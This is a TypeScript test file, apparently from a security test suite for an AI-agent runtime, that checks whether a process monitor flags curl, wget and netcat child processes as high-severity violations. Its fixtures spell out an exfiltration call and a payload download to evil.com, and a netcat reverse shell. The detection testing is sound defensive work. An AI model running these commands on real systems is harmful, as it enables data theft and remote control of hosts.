// AT-PROC-002: Suspicious Binary Detection
// ATLAS: AML.T0050 (Command and Scripting Interpreter)
// OWASP: LLM06 (Excessive Agency)
// OWASP Agentic: ASI05 (Unexpected Code Execution (RCE))
//
// Verifies that the process monitor classifies a child process running a
// binary commonly used for exfiltration, lateral movement, or exploitation
// (curl, wget, nc) as a violation. Each test has a poll of the running
// monitor list the processes the test gives, which carry no category or
// severity, instead of the host's; the monitor's own host poll is an hour
// apart. The pids are far above any the host gives.

import { it, expect, beforeEach, afterEach } from 'vitest';
import { describeWithCapability } from '../../harness/capabilities';
import { createAdapter } from '../../harness/create-adapter';
import type { ObservedProcess, SecurityEvent, SecurityProductAdapter } from '../../harness/adapter';

describeWithCapability('process-monitoring', 'AT-PROC-002: Suspicious Binary Detection', () => {
  let arp: SecurityProductAdapter;

  const curl: ObservedProcess = { pid: 4_000_101, command: 'curl http://evil.com/exfil', user: 'agent', cpu: 1 };
  const wget: ObservedProcess = { pid: 4_000_102, command: '/usr/bin/wget -q http://evil.com/payload.sh', user: 'agent', cpu: 1 };
  const nc: ObservedProcess = { pid: 4_000_103, command: 'nc -e /bin/sh 10.0.0.1 4444', user: 'agent', cpu: 1 };

  /** The violations the monitor raised for the test's processes */
  function violations(): SecurityEvent[] {
    return arp.getEventsByCategory('violation').filter((e) => e.source === 'process' && (e.data?.pid as number) > 4_000_000);
  }

  beforeEach(async () => {
    arp = createAdapter({
      monitors: { process: true },
      processIntervalMs: 3_600_000,
    });
    await arp.start();
    expect(arp.observeProcesses, 'the adapter declares process-monitoring but has no observeProcesses()').toBeTypeOf('function');
  });

  afterEach(async () => {
    await arp.stop();
  });

  it('should classify a curl child process as a violation', async () => {
    await arp.observeProcesses!([curl]);

    const events = violations();
    expect(events).toHaveLength(1);
    expect(events[0].data!.binary).toBe('curl');
    expect(events[0].data!.command).toBe('curl http://evil.com/exfil');
    expect(events[0].severity).toBe('high');
  });

  it('should classify a wget child process as a violation', async () => {
    await arp.observeProcesses!([wget]);

    const events = violations();
    expect(events).toHaveLength(1);
    expect(events[0].data!.binary).toBe('wget');
    expect(events[0].severity).toBe('high');
  });

  it('should classify a netcat child process as a violation', async () => {
    await arp.observeProcesses!([nc]);

    const events = violations();
    expect(events).toHaveLength(1);
    expect(events[0].data!.binary).toBe('nc');
    expect(events[0].severity).toBe('high');
  });

  it('should classify all three suspicious binaries, and not a node child beside them', async () => {
    const node: ObservedProcess = { pid: 4_000_104, command: 'node worker.js', user: 'agent', cpu: 1 };
    await arp.observeProcesses!([curl, wget, nc, node]);

    const events = violations();
    expect(events.map((e) => e.data!.binary).sort()).toEqual(['curl', 'nc', 'wget']);
    for (const event of events) {
      expect(event.severity).toBe('high');
      expect(event.source).toBe('process');
    }
    expect(events.some((e) => e.data!.pid === node.pid)).toBe(false);
  });
});
